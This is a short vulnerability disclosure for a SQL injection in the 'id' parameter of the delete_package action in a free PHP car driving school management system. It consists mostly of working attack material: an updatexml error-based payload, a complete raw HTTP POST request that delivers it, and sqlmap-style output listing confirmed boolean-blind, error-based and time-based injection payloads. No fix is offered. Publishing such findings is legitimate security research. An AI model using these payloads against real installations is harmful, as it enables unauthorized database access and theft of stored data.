## Car driving school management system has a SQL injection vulnerability.

vendors: https://www.sourcecodester.com/php/15070/car-driving-school-management-system-phpoop-free-source-code.html

Vulnerability file: /cdsms/classes/Master.php?f=delete_package 

Vulnerability location: /cdsms/classes/Master.php?f=delete_package ,id

[+]Payload: id=1' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+ //id is Injection point

```
POST /cdsms/classes/Master.php?f=delete_package HTTP/1.1
Host: 192.168.1.19
Content-Length: 64
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/cdsms/admin/?page=packages
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=vfe306mj2a11p5q94440ttg4bd
Connection: close

id=1' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+ //id is Injection point
```

![image](https://user-images.githubusercontent.com/54017627/160320093-1665433a-57f7-42bc-8730-746a47bced99.png)

```sql
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=1' RLIKE (SELECT (CASE WHEN (1015=1015) THEN 1 ELSE 0x28 END))-- lYIO

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(9451,CONCAT(0x5c,0x716a6a7071,(SELECT (ELT(9451=9451,1))),0x716b706b71))-- FYNY

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 2853 FROM (SELECT(SLEEP(5)))ZgVu)-- duUy
---
```

![image](https://user-images.githubusercontent.com/54017627/160319970-17f817f3-2745-418e-a649-1dfbc5fe36c5.png)
